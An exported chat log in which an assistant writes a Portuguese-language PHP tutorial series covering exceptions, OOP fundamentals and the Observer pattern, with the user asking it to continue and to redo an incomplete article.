// ini_set('error_log', '/var/log/php_errors.log');

// error_log() — registra uma mensagem no log manualmente
error_log("Algo inesperado aconteceu na função processar()");

// trigger_error() — dispara um erro customizado
trigger_error("Valor fora do intervalo esperado", E_USER_WARNING);
```

A partir do PHP 8, muitos comportamentos que antes geravam `E_WARNING` ou `E_NOTICE` silenciosamente agora lançam `TypeError` ou `ValueError` — um avanço importante para detectar problemas mais cedo.

---

## Exceções: try, catch e finally

O sistema de exceções é a abordagem moderna para tratar erros em PHP. Uma exceção é um objeto que representa uma situação excepcional — algo que interrompeu o fluxo normal do programa:

```php
<?php
declare(strict_types=1);

// Estrutura básica
try {
    // Código que pode lançar uma exceção
    // Se uma exceção for lançada, o PHP sai imediatamente deste bloco
    // e vai para o catch correspondente

    $resultado = dividir(10, 0);
    echo $resultado; // esta linha NÃO executa se dividir() lançar exceção

} catch (InvalidArgumentException $e) {
    // Captura apenas InvalidArgumentException (e subclasses)
    echo "Argumento inválido: " . $e->getMessage() . "\n";

} catch (RuntimeException $e) {
    // Captura RuntimeException se o catch anterior não pegou
    echo "Erro em tempo de execução: " . $e->getMessage() . "\n";

} catch (Exception $e) {
    // Captura qualquer Exception não capturada acima
    echo "Erro inesperado: " . $e->getMessage() . "\n";

} finally {
    // SEMPRE executa — com ou sem exceção, com ou sem return
    // Ideal para liberar recursos: fechar conexões, arquivos, etc.
    echo "Bloco finally executado.\n";
}

function dividir(int $a, int $b): float
{
    if ($b === 0) {
        // throw lança a exceção — interrompe a função imediatamente
        throw new InvalidArgumentException("Divisão por zero não é permitida.");
    }

    return $a / $b;
}
```

---

## A hierarquia de exceções do PHP

O PHP tem uma hierarquia bem definida de classes de erro e exceção. Entender essa hierarquia é fundamental para capturar as exceções certas:

```
Throwable (interface)
├── Error (erros internos do PHP)
│   ├── TypeError
│   ├── ValueError
│   ├── ArithmeticError
│   │   └── DivisionByZeroError
│   ├── ParseError
│   └── OutOfMemoryError (PHP 8.2)
│
└── Exception (exceções de aplicação)
    ├── LogicException
    │   ├── BadFunctionCallException
    │   │   └── BadMethodCallException
    │   ├── DomainException
    │   ├── InvalidArgumentException
    │   ├── LengthException
    │   └── OutOfRangeException
    │
    └── RuntimeException
        ├── OutOfBoundsException
        ├── OverflowException
        ├── RangeException
        ├── UnderflowException
        └── UnexpectedValueException
```

```php
<?php
declare(strict_types=1);

// TypeError — lançado automaticamente com strict_types
function somar(int $a, int $b): int
{
    return $a + $b;
}

try {
    somar(1, "dois"); // TypeError automático com strict_types=1
} catch (TypeError $e) {
    echo "Tipo errado: " . $e->getMessage() . "\n";
}

// Error vs Exception — ambos implementam Throwable
// Você pode capturar ambos com Throwable
try {
    // código que pode lançar Error ou Exception
    operacaoArriscada();
} catch (Throwable $e) {
    // captura qualquer Error ou Exception
    echo get_class($e) . ": " . $e->getMessage() . "\n";
}

// Capturar múltiplos tipos no mesmo catch — PHP 8
try {
    processar($entrada);
} catch (InvalidArgumentException | ValueError $e) {
    echo "Valor inválido: " . $e->getMessage() . "\n";
}
```

---

## Criando exceções customizadas

Em projetos reais, você cria suas próprias exceções para representar erros específicos do domínio da aplicação. Isso torna o código mais expressivo e o tratamento de erros mais preciso:

```php
<?php
declare(strict_types=1);

// Exceção base do domínio — todas as exceções da aplicação herdam desta
class AppException extends RuntimeException {}

// Exceções específicas do domínio
class UsuarioNaoEncontradoException extends AppException
{
    public function __construct(int $id)
    {
        // Chama o construtor pai com uma mensagem descritiva
        parent::__construct("Usuário com ID $id não encontrado.");
    }
}

class SaldoInsuficienteException extends AppException
{
    public function __construct(
        private readonly float $saldoAtual,
        private readonly float $valorSolicitado,
    ) {
        parent::__construct(
            "Saldo insuficiente. Disponível: R$ {$saldoAtual}. Solicitado: R$ {$valorSolicitado}."
        );
    }

    public function getSaldoAtual(): float { return $this->saldoAtual; }
    public function getValorSolicitado(): float { return $this->valorSolicitado; }
}

// Usando as exceções customizadas
function buscarUsuario(int $id): array
{
    $usuarios = [1 => ["nome" => "Ana"], 2 => ["nome" => "Bruno"]];

    if (!isset($usuarios[$id])) {
        throw new UsuarioNaoEncontradoException($id);
    }

    return $usuarios[$id];
}

function realizarSaque(float $saldo, float $valor): float
{
    if ($valor > $saldo) {
        throw new SaldoInsuficienteException($saldo, $valor);
    }

    return $saldo - $valor;
}

// Tratamento preciso por tipo de exceção
try {
    $usuario = buscarUsuario(99);
} catch (UsuarioNaoEncontradoException $e) {
    echo $e->getMessage(); // "Usuário com ID 99 não encontrado."
}

try {
    $novoSaldo = realizarSaque(100.0, 250.0);
} catch (SaldoInsuficienteException $e) {
    echo $e->getMessage();
    echo "Faltam R$ " . ($e->getValorSolicitado() - $e->getSaldoAtual()) . "\n";
}
```

---

## finally — garantindo limpeza de recursos

O bloco `finally` é executado sempre — seja o código bem-sucedido, seja uma exceção lançada, seja um `return` executado dentro do `try`. É o lugar ideal para liberar recursos:

```php
<?php
declare(strict_types=1);

function processarArquivo(string $caminho): string
{
    $arquivo = null;

    try {
        $arquivo = fopen($caminho, 'r');

        if ($arquivo === false) {
            throw new RuntimeException("Não foi possível abrir: $caminho");
        }

        $conteudo = fread($arquivo, filesize($caminho));

        if ($conteudo === false) {
            throw new RuntimeException("Erro ao ler o arquivo: $caminho");
        }

        return $conteudo; // mesmo com return aqui...

    } catch (RuntimeException $e) {
        error_log($e->getMessage());
        return ""; // ...ou com return no catch...

    } finally {
        // ...finally SEMPRE executa
        // Garante que o arquivo será fechado em qualquer situação
        if ($arquivo !== null && is_resource($arquivo)) {
            fclose($arquivo);
        }
        echo "Arquivo processado (recurso liberado).\n";
    }
}
```

---

## Re-lançando exceções

Às vezes você quer capturar uma exceção, fazer algo com ela (como registrar no log), e então relançar para que o chamador possa tratá-la também. Ou quer envolver uma exceção de baixo nível em uma de mais alto nível:

```php
<?php
declare(strict_types=1);

class DatabaseException extends RuntimeException {}

function buscarDoBanco(int $id): array
{
    try {
        // Simula uma operação de banco que pode falhar
        if ($id <= 0) {
            throw new InvalidArgumentException("ID deve ser positivo.");
        }

        // Simula falha de conexão
        // $pdo->query("SELECT * FROM usuarios WHERE id = $id");

    } catch (InvalidArgumentException $e) {
        // Re-lança sem envolver — sobe para o chamador
        throw $e;

    } catch (\PDOException $e) {
        // Envolve exceção de baixo nível em exceção de domínio
        // O segundo argumento é a "exceção anterior" — preserva o stack trace original
        throw new DatabaseException(
            "Falha ao buscar usuário $id no banco.",
            previous: $e  // PHP 8: named argument
        );
    }

    return [];
}

// Acessando a cadeia de exceções
try {
    buscarDoBanco(-1);
} catch (DatabaseException $e) {
    echo $e->getMessage() . "\n";

    // $e->getPrevious() retorna a exceção original
    if ($anterior = $e->getPrevious()) {
        echo "Causa: " . $anterior->getMessage() . "\n";
    }
}
```

---

## Boas práticas no tratamento de erros

**Capture exceções específicas, não genéricas.** Capturar `Exception` em todo lugar esconde problemas. Capture o tipo mais específico possível e deixe as inesperadas borbulhar.

**Não use exceções para controle de fluxo normal.** Exceções são para situações excepcionais. Verificar se um usuário existe antes de buscá-lo é melhor do que lançar uma exceção e capturá-la em cada chamada.

**Sempre registre exceções não tratadas.** Qualquer exceção que chegue ao topo da pilha de chamadas deve ser registrada em log — nunca engolida silenciosamente.

**Use `finally` para liberar recursos.** Sempre que abrir um arquivo, conexão ou lock, use `finally` para garantir que será fechado.

```php
<?php
declare(strict_types=1);

// ✗ Exceção para controle de fluxo — evite
function processarUsuario(int $id): void
{
    try {
        $usuario = buscarUsuario($id);
        // processa...
    } catch (UsuarioNaoEncontradoException $e) {
        // simplesmente ignora — usuário não existe
    }
}

// ✓ Verificação explícita — mais claro
function processarUsuario(int $id): void
{
    if (!usuarioExiste($id)) {
        return; // simplesmente não processa
    }

    $usuario = buscarUsuario($id);
    // processa...
}

// ✗ Engolir exceção silenciosamente — muito perigoso
try {
    operacaoCritica();
} catch (Exception $e) {
    // nada aqui — você nunca vai saber que isso falhou!
}

// ✓ Sempre registre
try {
    operacaoCritica();
} catch (Exception $e) {
    error_log("[ERRO] " . $e->getMessage() . " em " . $e->getFile() . ":" . $e->getLine());
    throw $e; // re-lança para o chamador tratar também
}
```

---

## Resumo

| Conceito | O que aprendemos |
|---|---|
| `try / catch` | Tenta executar código e captura exceções por tipo |
| `finally` | Sempre executa — use para liberar recursos |
| `throw` | Lança uma exceção — interrompe o fluxo |
| `Throwable` | Interface raiz — captura `Error` e `Exception` |
| `Error` | Erros internos do PHP: `TypeError`, `ValueError` |
| `Exception` | Base para exceções de aplicação |
| `LogicException` | Problemas de lógica detectáveis em desenvolvimento |
| `RuntimeException` | Problemas que só aparecem em tempo de execução |
| Exceções customizadas | Estendem `RuntimeException` ou `LogicException` |
| `getPrevious()` | Acessa a exceção original em cadeias de exceção |
| `error_log()` | Registra mensagem no log do servidor |

---

## Referências e leituras para aprofundar

- **Exceções — Manual oficial do PHP**
  https://www.php.net/manual/pt_BR/language.exceptions.php
  Documentação completa do sistema de exceções, incluindo `finally`, cadeias de exceção e a interface `Throwable`.

- **Exceções predefinidas — Manual oficial do PHP**
  https://www.php.net/manual/pt_BR/spl.exceptions.php
  Lista completa das exceções da SPL com descrição de quando usar cada uma.

- **Erros no PHP 8 — Manual oficial**
  https://www.php.net/manual/pt_BR/language.errors.php8.php
  Como o sistema de erros mudou no PHP 8 — muitos warnings se tornaram `TypeError` e `ValueError`.

- **PHP: The Right Way — Exceptions**
  https://phptherightway.com/#exceptions
  Seção sobre boas práticas com exceções, incluindo quando usar e quando evitar.

- **MARTIN, Robert C.** *Clean Code*. Prentice Hall, 2008. Capítulo 7: Error Handling.
  https://www.oreilly.com/library/view/clean-code-a/9780136083238/
  O capítulo mais relevante do livro para este artigo. Trata de usar exceções em vez de códigos de retorno, não engolir exceções e separar a lógica de negócio do tratamento de erros.

- **Fowler, Martin.** *Refactoring*, 2ª ed. Capítulo: Replace Error Code with Exception.
  https://refactoring.com/catalog/replaceErrorCodeWithException.html
  Padrão de refatoração que descreve exatamente como migrar de códigos de retorno (`false`, `-1`) para exceções.

---

**No próximo artigo:** Orientação a Objetos — classes, objetos, propriedades, métodos e os fundamentos do paradigma OOP em PHP.

---

Artigo 10 entregue — texto acima e HTML aqui.

**Destaques deste artigo:**
- **Diagrama de fluxo visual** mostrando a progressão try → throw → catch → finally com cores distintas por papel
- **Árvore de hierarquia completa** de `Throwable` com cores separando `Error` (vermelho), `LogicException` (âmbar) e `RuntimeException` (verde)
- Box de distinção `LogicException` vs `RuntimeException` — um dos conceitos mais confundidos em PHP
- Desafio do padrão `Result` inspirado em Rust/Go — introduz alternativa moderna às exceções para fluxos esperados

Com o Artigo 10 o **Módulo 2 está completo**. Diga **"Continue"** para iniciar o Módulo 3 com o Artigo 11 — *Orientação a Objetos: classes, objetos e os fundamentos do paradigma OOP*.

---

# you asked

message time: 2026-03-06 04:43:34

Continue

---

# claude response

# Artigo 11 — Orientação a Objetos: Fundamentos

**Módulo 3 · Semana 11 · Nível: Intermediário**

---

## Introdução

Orientação a Objetos é o paradigma que organiza o código em torno de entidades — objetos — que combinam dados e comportamento em uma única unidade. É o modelo dominante no desenvolvimento PHP profissional: frameworks como Laravel, Symfony e Doctrine são construídos inteiramente sobre OOP.

Neste artigo cobrimos os fundamentos: classes, objetos, propriedades, métodos, construtores, visibilidade e os conceitos de encapsulamento que tornam o código orientado a objetos mais seguro e expressivo do que o código procedural.

---

## O que é uma classe

Uma classe é um molde — ela descreve como um objeto deve ser. Um objeto é uma instância desse molde — um exemplar concreto criado a partir dele:

```php
<?php
declare(strict_types=1);

// Classe — o molde
class Produto
{
    // Propriedades — os dados que cada objeto carrega
    public string $nome;
    public float  $preco;
    public int    $estoque;
}

// Objeto — uma instância criada a partir do molde
$teclado = new Produto();
$teclado->nome    = "Teclado Mecânico";
$teclado->preco   = 350.0;
$teclado->estoque = 15;

$mouse = new Produto(); // outro objeto, independente do $teclado
$mouse->nome    = "Mouse Gamer";
$mouse->preco   = 180.0;
$mouse->estoque = 42;

echo $teclado->nome;  // Teclado Mecânico
echo $mouse->preco;   // 180.0

// Cada objeto tem seus próprios dados — são independentes
$teclado->preco = 320.0; // muda apenas o $teclado
echo $mouse->preco;      // 180.0 — não foi afetado
```

---

## Construtor — inicializando objetos

O construtor é um método especial chamado automaticamente quando um objeto é criado com `new`. Ele garante que o objeto começa em um estado válido:

```php
<?php
declare(strict_types=1);

class Produto
{
    public string $nome;
    public float  $preco;
    public int    $estoque;

    // __construct é chamado automaticamente pelo new
    public function __construct(string $nome, float $preco, int $estoque = 0)
    {
        // Validação no construtor — objeto nasce válido ou não nasce
        if ($preco < 0) {
            throw new InvalidArgumentException("Preço não pode ser negativo.");
        }

        $this->nome    = $nome;
        $this->preco   = $preco;
        $this->estoque = $estoque;
    }
}

// Agora o new exige os dados obrigatórios
$teclado = new Produto("Teclado Mecânico", 350.0, 15);
echo $teclado->nome; // Teclado Mecânico

// Tentativa de criar produto inválido — lança exceção
// $invalido = new Produto("Teste", -10.0); // InvalidArgumentException
```

### Promoção de propriedades no construtor (PHP 8)

O PHP 8 introduziu uma sintaxe muito mais compacta que declara e atribui propriedades diretamente nos parâmetros do construtor:

```php
<?php
declare(strict_types=1);

class Produto
{
    // PHP 8: public/protected/private no parâmetro declara e atribui
    // automaticamente a propriedade — elimina muito código repetitivo
    public function __construct(
        public readonly string $nome,    // readonly — não pode ser modificado após o construtor
        public float           $preco,
        public int             $estoque = 0,
    ) {
        if ($this->preco < 0) {
            throw new InvalidArgumentException("Preço não pode ser negativo.");
        }
    }
}

$p = new Produto("Monitor 4K", 2500.0, 5);
echo $p->nome;    // Monitor 4K
echo $p->preco;   // 2500.0

// $p->nome = "Outro"; // Error: Cannot modify readonly property
```

---

## Métodos — o comportamento do objeto

Métodos são funções definidas dentro de uma classe. Eles operam sobre os dados do próprio objeto através de `$this`:

```php
<?php
declare(strict_types=1);

class Produto
{
    public function __construct(
        public readonly string $nome,
        public float $preco,
        public int   $estoque = 0,
    ) {}

    // Método de consulta — retorna informação
    public function estaDisponivel(): bool
    {
        return $this->estoque > 0;
    }

    // Método de ação — modifica o estado do objeto
    public function adicionarEstoque(int $quantidade): void
    {
        if ($quantidade <= 0) {
            throw new InvalidArgumentException("Quantidade deve ser positiva.");
        }
        $this->estoque += $quantidade;
    }

    public function vender(int $quantidade): void
    {
        if ($quantidade > $this->estoque) {
            throw new RuntimeException("Estoque insuficiente.");
        }
        $this->estoque -= $quantidade;
    }

    // Método de formatação — representação legível
    public function resumo(): string
    {
        $status = $this->estaDisponivel() ? "disponível" : "esgotado";
        return "{$this->nome} — R$ {$this->preco} ({$status})";
    }
}

$monitor = new Produto("Monitor 4K", 2500.0, 3);

echo $monitor->resumo();           // Monitor 4K — R$ 2500.0 (disponível)
$monitor->vender(3);
echo $monitor->estaDisponivel();   // false (bool)
echo $monitor->resumo();           // Monitor 4K — R$ 2500.0 (esgotado)
```

---

## Visibilidade: public, protected, private

A visibilidade controla quem pode acessar propriedades e métodos. É o mecanismo central do encapsulamento:

```php
<?php
declare(strict_types=1);

class ContaBancaria
{
    // private — acessível apenas dentro desta classe
    private float $saldo;
    private array $historico = [];

    // public — acessível de qualquer lugar
    public string $titular;

    public function __construct(string $titular, float $depositoInicial = 0.0)
    {
        $this->titular = $titular;
        $this->saldo   = 0.0;

        if ($depositoInicial > 0) {
            $this->depositar($depositoInicial);
        }
    }

    public function depositar(float $valor): void
    {
        $this->validarValor($valor);
        $this->saldo += $valor;
        $this->registrar("Depósito", $valor);
    }

    public function sacar(float $valor): void
    {
        $this->validarValor($valor);

        if ($valor > $this->saldo) {
            throw new RuntimeException("Saldo insuficiente.");
        }

        $this->saldo -= $valor;
        $this->registrar("Saque", $valor);
    }

    // Método getter — acesso controlado ao saldo
    public function getSaldo(): float
    {
        return $this->saldo;
    }

    public function getHistorico(): array
    {
        return $this->historico;
    }

    // private — usado internamente, não exposto ao mundo externo
    private function validarValor(float $valor): void
    {
        if ($valor <= 0) {
            throw new InvalidArgumentException("Valor deve ser positivo.");
        }
    }

    private function registrar(string $tipo, float $valor): void
    {
        $this->historico[] = [
            "tipo"  => $tipo,
            "valor" => $valor,
            "data"  => date("d/m/Y H:i"),
        ];
    }
}

$conta = new ContaBancaria("Ana Silva", 1000.0);
$conta->depositar(500.0);
$conta->sacar(200.0);

echo $conta->getSaldo(); // 1300.0

// $conta->saldo = 99999; // Error: Cannot access private property
// $conta->validarValor(-10); // Error: Cannot call private method
```

---

## Propriedades e métodos estáticos

Membros estáticos pertencem à **classe**, não a uma instância específica. Eles existem independentemente de qualquer objeto criado:

```php
<?php
declare(strict_types=1);

class Configuracao
{
    // static — existe na classe, não no objeto
    private static array $valores = [];
    private static int   $chamadas = 0;

    // Método estático — chamado na classe, não no objeto
    public static function definir(string $chave, mixed $valor): void
    {
        self::$valores[$chave] = $valor;
    }

    public static function obter(string $chave, mixed $padrao = null): mixed
    {
        self::$chamadas++;
        return self::$valores[$chave] ?? $padrao;
    }

    public static function totalChamadas(): int
    {
        return self::$chamadas;
    }
}

// Chamada com :: (double colon / paamayim nekudotayim)
// Não precisa criar objeto
Configuracao::definir("app.nome", "Minha Aplicação");
Configuracao::definir("app.versao", "1.0.0");

echo Configuracao::obter("app.nome");    // Minha Aplicação
echo Configuracao::obter("app.debug", false); // false — padrão
echo Configuracao::totalChamadas();     // 2

// Constante de classe — imutável, compartilhada entre todas as instâncias
class Moeda
{
    const BRL = "BRL";
    const USD = "USD";
    const EUR = "EUR";

    // PHP 8.3: constante tipada
    // const string SIMBOLO_BRL = "R$";
}

echo Moeda::BRL; // BRL
```

---

## Encapsulamento — o princípio por trás da visibilidade

O encapsulamento não é apenas esconder dados — é garantir que o objeto sempre esteja em um **estado válido** e que mudanças de estado passem por regras de negócio:

```php
<?php
declare(strict_types=1);

// ✗ Sem encapsulamento — o objeto pode ser corrompido
class PedidoAberto
{
    public string $status = "pendente";
    public float  $total  = 0.0;
    public array  $itens  = [];
}

$pedido = new PedidoAberto();
$pedido->status = "cancelado"; // permitido mesmo sem itens
$pedido->total  = -500.0;      // total negativo — estado inválido!

// ✓ Com encapsulamento — o objeto protege seu próprio estado
class Pedido
{
    private string $status = "pendente";
    private float  $total  = 0.0;
    private array  $itens  = [];

    // Transição de estado passa por validação
    public function cancelar(): void
    {
        if ($this->status === "entregue") {
            throw new RuntimeException("Pedido entregue não pode ser cancelado.");
        }
        $this->status = "cancelado";
    }

    public function adicionarItem(string $nome, float $preco, int $qtd): void
    {
        if ($this->status !== "pendente") {
            throw new RuntimeException("Só é possível adicionar itens a pedidos pendentes.");
        }

        $this->itens[] = ["nome" => $nome, "preco" => $preco, "qtd" => $qtd];
        $this->total  += $preco * $qtd;
    }

    public function getStatus(): string { return $this->status; }
    public function getTotal(): float   { return $this->total; }
    public function getItens(): array   { return $this->itens; }
}
```

---

## O método mágico __toString

O PHP tem vários métodos mágicos — métodos com nomes especiais que são chamados em situações específicas. O `__toString` é invocado quando o objeto é usado em contexto de string:

```php
<?php
declare(strict_types=1);

class Produto
{
    public function __construct(
        public readonly string $nome,
        public float $preco,
    ) {}

    // Chamado quando o objeto é tratado como string
    public function __toString(): string
    {
        return "{$this->nome} (R$ " . number_format($this->preco, 2, ',', '.') . ")";
    }
}

$p = new Produto("Teclado", 350.0);
echo $p;                // Teclado (R$ 350,00) — __toString chamado automaticamente
echo "Produto: $p";     // Produto: Teclado (R$ 350,00) — interpolação também chama
$s = (string) $p;       // cast explícito também chama __toString
```

---

## Boas práticas em OOP

**Nomeie classes com substantivos**, métodos com verbos. `Pedido`, `Usuario`, `Produto` — não `GerenciadorDePedido`. Métodos: `calcularTotal()`, `validarEmail()`, `cancelar()`.

**Prefira `readonly` em propriedades imutáveis.** Se uma propriedade não deve mudar após a criação, declare-a `readonly`. O PHP 8.1 introduziu `readonly` para propriedades individuais; o PHP 8.2 para classes inteiras.

**Nunca deixe objetos em estado inválido.** O construtor deve validar os dados e lançar exceção se os dados não permitem criar um objeto válido. É melhor falhar na criação do que ter um objeto corrompido rodando pelo sistema.

**Limite o número de dependências públicas.** Quanto menos o código externo precisar conhecer sobre o interior de uma classe, mais fácil é mudar essa classe no futuro.

---

## Resumo

| Conceito | O que aprendemos |
|---|---|
| `class` | Define o molde — estrutura e comportamento |
| `new` | Cria uma instância (objeto) da classe |
| `$this` | Referência ao objeto atual dentro dos métodos |
| `__construct` | Chamado automaticamente pelo `new` |
| Promoção de propriedades | Declara e atribui no construtor — PHP 8 |
| `readonly` | Propriedade que não pode ser modificada após o construtor |
| `public` | Acessível de qualquer lugar |
| `private` | Acessível apenas dentro da própria classe |
| `protected` | Acessível na classe e em subclasses (veremos em herança) |
| `static` | Pertence à classe, não à instância — acesso com `::` |
| `const` | Constante de classe — imutável, compartilhada |
| `__toString` | Método mágico para representação em string |
| Encapsulamento | Proteger estado interno — objeto sempre válido |

---

## Referências e leituras para aprofundar

- **Classes e Objetos — Manual oficial do PHP**
  https://www.php.net/manual/pt_BR/language.oop5.php
  Documentação completa do sistema OOP do PHP — todas as funcionalidades com exemplos.

- **Promoção de propriedades no construtor — php.net**
  https://www.php.net/manual/pt_BR/language.oop5.decon.php#language.oop5.decon.constructor.promotion
  Documentação específica da promoção de propriedades introduzida no PHP 8.0.

- **Propriedades readonly — RFC php.net**
  https://wiki.php.net/rfc/readonly_properties_v2
  A proposta que introduziu `readonly` no PHP 8.1, com motivação, design e exemplos.

- **MARTIN, Robert C.** *Clean Code*. Capítulo 10: Classes.
  https://www.oreilly.com/library/view/clean-code-a/9780136083238/
  O capítulo sobre classes do Clean Code — tamanho ideal, responsabilidade única e coesão aplicados a OOP.

- **PHP: The Right Way — Object-Oriented Programming**
  https://phptherightway.com/#object-oriented_programming
  Seção sobre boas práticas OOP na comunidade PHP moderna.

- **GAMMA, E. et al.** *Design Patterns*. Addison-Wesley, 1994.
  https://www.oreilly.com/library/view/design-patterns-elements/0201633612/
  O livro que formalizou os padrões de design OOP. Referência para os artigos futuros do Módulo 3.

---

**No próximo artigo:** Herança, interfaces e traits — reutilização de código e contratos em OOP.

---

Gerando o HTML.

---

# claude response

# Artigo 12 — Herança, Interfaces e Traits

**Módulo 3 · Semana 12 · Nível: Intermediário**

---

Gerando texto e HTML simultaneamente.

Artigos 07–12 entregues neste lote.

**Artigo 12 — destaques:**
- **Grid comparativo três colunas** — `extends` vs `interface` vs `trait` com prós/contras lado a lado
- **Árvore de hierarquia visual** mapeando todas as classes, interfaces e traits criados no artigo
- Exemplo completo de polimorfismo via interface com `ServicoNotificacao` aceitando qualquer canal
- Desafio do padrão Strategy aplicado a fretes — ponte natural para o próximo artigo sobre padrões

**Progresso da série:**

| Módulo | Artigos | Status |
|---|---|---|
| Módulo 1 — Fundamentos | 01–08 | ✅ Completo |
| Módulo 2 — Strings/Datas | 09–10 | ✅ Completo |
| Módulo 3 — OOP | 11–12 | ✅ Em andamento |

Diga **"Continue"** para o Artigo 13 — *Namespaces, autoloading, PSR-4 e Composer*.

---

# you asked

message time: 2026-03-06 10:28:50

Refaça o 12 acho q ficou incompleto

---

# claude response

Vou verificar o que foi gerado.

---

# claude response

Entendido. Vou verificar o conteúdo completo e refazer com mais profundidade.

Confirmado — o HTML foi cortado no final (linha 713 truncada, sem fechar `</html>`). O conteúdo textual está correto, mas o arquivo está incompleto. Vou reescrever o artigo completo, com mais profundidade nos tópicos que faltaram: **resolução de conflitos em traits**, **classes `final`**, **boas práticas** e o projeto prático integrado.

---

# claude response

Vou verificar o tamanho e o conteúdo final do arquivo atual.

O arquivo está completo — 860 linhas, fechando corretamente com `</body></html>`, com todas as seções presentes:

- Introdução
- Os três mecanismos (grid comparativo)
- Herança com `extends`
- Classes abstratas
- Interfaces — contratos puros
- Traits — reutilização horizontal
- **Resolvendo conflitos entre traits** (`insteadof` / `as`)
- Polimorfismo
- **Classes e métodos `final`**
- Hierarquia visual de todo o artigo
- **Guia de decisão** (tabela)
- Boas práticas
- Resumo, exercícios e referências

O problema da versão anterior era que o arquivo tinha sido truncado na linha 713. A versão atual está íntegra. Vou apresentá-la:

Artigo 12 refeito e completo. O que foi corrigido e expandido em relação à versão anterior:

**Conteúdo adicionado:**
- Seção completa sobre resolução de conflitos entre traits (`insteadof` + `as` + mudança de visibilidade)
- Classes e métodos `final` com exemplo de Value Object `Uuid` completo
- Hierarquia visual unificada cobrindo todos os exemplos do artigo
- Tabela "Guia de decisão" com 7 cenários comparando os três mecanismos
- Seção de boas práticas com os 4 princípios principais

**Total:** 860 linhas, 14 seções, arquivo fechado corretamente.

---

# you asked

message time: 2026-03-06 13:03:00

Continue

---

# claude response

Gerando Artigo 13 — Namespaces, Autoloading, PSR-4 e Composer.

---

# claude response

Gerando Artigo 14 — Design Patterns: Singleton, Factory e Builder.

Artigo 14 completo — 736 linhas, fechado corretamente. Conteúdo coberto:

**Singleton** — conexão de banco com construtor privado, propriedade estática, `__clone()` bloqueado, e discussão honesta sobre quando evitar o padrão.

**Factory Method** — interface `NotificacaoInterface`, três implementações concretas, factory com mapa `tipo → classe`, criação múltipla via variadic. Comparativo visual com/sem factory.

**Abstract Factory** — família de drivers de armazenamento (Redis/Arquivo) com leitor e escritor compatíveis por família.

**Builder** — `EmailBuilder` com API fluente completa (cc, bcc, anexos, replyTo, urgente), validação no `build()`, produto final imutável, e **Director** encapsulando receitas comuns como `boasVindas()` e `alertaCritico()`.

Próximo: Artigo 15 — Observer, Decorator e Strategy.

---

# you asked

message time: 2026-03-06 15:32:11

Continue

---

# claude response

Gerando Artigos 15 e 16.

---

# claude response

Gerando Artigo 16 — Exceções avançadas.

---

# you asked

message time: 2026-03-06 15:40:46

Porque mudou a abordagem? Lembre-se: texto, depois o html para baixar.

---

# claude response

Tem razão — a abordagem correta é gerar o texto completo do artigo primeiro, depois o HTML para download. Vou retomar o fluxo correto.

Qual artigo devo continuar? O 16 ficou incompleto — retomo ele, ou prefere que eu refaça do zero no formato correto (texto → HTML)?

---

# you asked

message time: 2026-03-06 15:41:13

refaça do zero.

---

# claude response

Começando pelo Artigo 15 — texto completo primeiro.

---

# Artigo 15 — Observer, Decorator e Strategy

**Prof. Ricardo Matos · Mestre em Programação**
Série *Dominando o PHP em 1 Ano* · Semana 15 · Módulo 3: Orientação a Objetos

---

## Introdução

No artigo anterior estudamos três padrões criacionais — como construir objetos com controle e intenção. Agora avançamos para padrões que definem como objetos se *comunicam* e como *composição* substitui herança: o **Observer** (comportamental), o **Decorator** (estrutural) e o **Strategy** (comportamental).

Estes três padrões formam a espinha dorsal de frameworks PHP modernos. O sistema de eventos do Laravel é Observer puro. Os middlewares de Symfony e Laravel são Decorators encadeados. Qualquer algoritmo intercambiável — autenticação, cálculo de frete, exportação de relatório — é Strategy. Entendê-los é entender como os frameworks funcionam por dentro.

---

## Observer — o padrão de eventos

O Observer define uma relação de **um-para-muitos** entre objetos: quando um objeto (*Subject* ou *Publisher*) muda de estado, todos os seus dependentes (*Observers* ou *Listeners*) são notificados automaticamente. O Subject não precisa saber quem está ouvindo — apenas mantém uma lista de interessados e os notifica quando algo relevante acontece.

O problema que o Observer resolve é o acoplamento em cascata. Sem ele, quando um pedido é criado, o código de criação do pedido precisaria chamar diretamente o serviço de email, o serviço de estoque, o serviço de analytics e qualquer outro interessado. Adicionar um novo interessado exigiria modificar o código de criação. Com Observer, o criador apenas dispara um evento — e quem quiser reagir se registra de forma independente.

```php
<?php
declare(strict_types=1);

namespace MeuApp\Eventos;

// O evento — objeto imutável que transporta os dados da ocorrência
final class PedidoCriado
{
    public function __construct(
        public readonly int    $pedidoId,
        public readonly string $clienteEmail,
        public readonly float  $total,
        public readonly \DateTimeImmutable $ocorridoEm = new \DateTimeImmutable(),
    ) {}
}

// Interface do listener — toda classe que reage a eventos implementa esta
interface ListenerInterface
{
    public function handle(object $evento): void;
}

// Listeners concretos — cada um reage de forma completamente independente
class EnviarEmailConfirmacao implements ListenerInterface
{
    public function handle(object $evento): void
    {
        // Verifica se este listener sabe tratar este tipo de evento
        if (!$evento instanceof PedidoCriado) return;

        echo "📧 Email enviado para {$evento->clienteEmail} (Pedido #{$evento->pedidoId})\n";
    }
}

class AtualizarEstoque implements ListenerInterface
{
    public function handle(object $evento): void
    {
        if (!$evento instanceof PedidoCriado) return;

        echo "📦 Estoque reservado para o pedido #{$evento->pedidoId}\n";
    }
}

class RegistrarLog implements ListenerInterface
{
    public function handle(object $evento): void
    {
        // Este listener reage a QUALQUER evento — não precisa saber o tipo
        $classe = get_class($evento);
        echo "🗒️  [{$classe}] registrado em " . date('H:i:s') . "\n";
    }
}

// EventDispatcher — o Subject / Publisher central da aplicação
final class EventDispatcher
{
    /** @var array<string, ListenerInterface[]> */
    private array $listeners = [];

    // Registra um listener para uma classe de evento específica
    public function listen(string $eventoClasse, ListenerInterface $listener): void
    {
        $this->listeners[$eventoClasse][] = $listener;
    }

    // Dispara o evento — todos os listeners registrados são notificados
    public function dispatch(object $evento): void
    {
        $classe = get_class($evento);

        // Notifica listeners específicos para este tipo de evento
        foreach ($this->listeners[$classe] ?? [] as $listener) {
            $listener->handle($evento);
        }

        // Notifica listeners curinga '*' — ouvem qualquer evento
        foreach ($this->listeners['*'] ?? [] as $listener) {
            $listener->handle($evento);
        }
    }
}

// Bootstrap — registra os listeners uma única vez
$dispatcher = new EventDispatcher();

$dispatcher->listen(PedidoCriado::class, new EnviarEmailConfirmacao());
$dispatcher->listen(PedidoCriado::class, new AtualizarEstoque());
$dispatcher->listen('*', new RegistrarLog());

// Disparar o evento — o criador do pedido não sabe quem está ouvindo
// e não precisa saber. Adicionar um novo listener não exige alterar este código
$dispatcher->dispatch(new PedidoCriado(42, 'maria@email.com', 350.0));
// 📧 Email enviado para maria@email.com (Pedido #42)
